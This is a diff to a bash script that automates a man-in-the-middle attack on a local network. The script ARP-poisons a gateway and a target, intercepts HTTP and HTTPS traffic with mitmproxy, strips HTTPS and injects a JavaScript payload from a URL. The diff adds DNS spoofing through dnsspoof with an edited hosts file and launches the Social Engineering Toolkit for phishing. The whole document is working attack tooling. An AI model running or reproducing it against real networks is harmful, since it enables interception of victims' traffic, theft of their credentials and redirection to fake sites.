@@ -5,6 +5,7 @@ HTTP_INTERCEPTION=0
 HTTPS_INTERCEPTION=0
 HTTPS_STRIPPING=0
 INJECT_JS=0
+DNSSPOOF=0
 PAYLOAD_URL=""
 INTERFACE=""
 
@@ -14,12 +15,13 @@ export PATH=$(pwd)/bin:${PATH}
 #####################################
 
 function help(){
-	echo "Usage: $0 [-g] [-n] [-s] [-x] [-j] <js payload url> [-i] <interface> ip_target1 ip_target2"
+	echo "Usage: $0 [-g] [-n] [-s] [-x] [-j] <js payload url> [-d] [-i] <interface> gateway_ip target_ip"
 	echo "       [-g] interactive mode for mitmproxy"
 	echo "       [-n] capture HTTP traffic"
 	echo "       [-s] capture HTTPS traffic"
 	echo "       [-x] stripping https"
 	echo "       [-j] inject js payload"
+	echo "       [-d] dnsspoof + setoolkit"
 	echo "       [-i] interface"
         exit 1
 }
@@ -38,7 +40,7 @@ if [ $# -lt 2 ] || [ $# -gt 10 ]; then
 fi
 
 #getting options -ins
-while getopts ":gnsxj:i:" OPT; do
+while getopts ":gnsxj:di:" OPT; do
     case $OPT in
         g)
             INTERACTIVE_MODE=1
@@ -65,6 +67,10 @@ while getopts ":gnsxj:i:" OPT; do
             fi
 	    	echo "INJECT_JS On"
             ;;
+        d)
+            DNSSPOOF=1
+	    	echo "DNSSPOOF On"
+            ;;
         i)
             INTERFACE=${OPTARG}
             if [ "X"${INTERFACE} == "X" ]; then
@@ -80,8 +86,8 @@ while getopts ":gnsxj:i:" OPT; do
 done
 
 shift $(($OPTIND - 1))
-TARGET1=$1
-TARGET2=$2
+GATEWAY=$1
+TARGET=$2
 
 #####################################
 # Installing mitmproxy
@@ -105,7 +111,7 @@ fi
 #####################################
 
 # Check target ips are not null
-if [ "X"${TARGET1} == "X" ] || [ "X"${TARGET2} == "X" ]; then
+if [ "X"${GATEWAY} == "X" ] || [ "X"${TARGET} == "X" ]; then
 	echo "target ip is missing!"
 	help
 fi
@@ -134,10 +140,30 @@ if [ ${HTTP_INTERCEPTION} -eq 1 ] || [ ${HTTPS_INTERCEPTION} -eq 1 ]; then
 fi
 
 #####################################
-# Arp poisoning
+# DNS spoofing
 #####################################
 
-arpoison ${TARGET1} ${TARGET2}
+if [ ${DNSSPOOF} -eq 1 ]; then
+
+	echo "Editing hosts file..."
+	vi $(pwd)/conf/hosts
+
+	echo "DNS spoofing..."
+	xterm -T "DNS spoofing target ${TARGET}" -hold -e dnsspoof -i ${INTERFACE} -f $(pwd)/conf/hosts udp dst port 53 and src ${TARGET} &
+
+	echo "Launching setoolkit..."
+	xterm -T "Social Engineering Toolkit" -hold -e setoolkit &
+
+	echo "Press a key when ready"
+
+	read
+fi
+
+#####################################
+# ARP poisoning
+#####################################
+
+arpoison ${GATEWAY} ${TARGET}
 
 #####################################
 # mitmproxy
@@ -155,9 +181,9 @@ if [ ${INJECT_JS} -eq 1 ]; then
 fi
 
 if [ ${INTERACTIVE_MODE} -eq 1 ]; then
-	xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}" &
+	xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"} &
 else
 	echo "Running mitmdump..."
-	${MITMPROXY_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"
+	${MITMPROXY_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"}
 fi
 
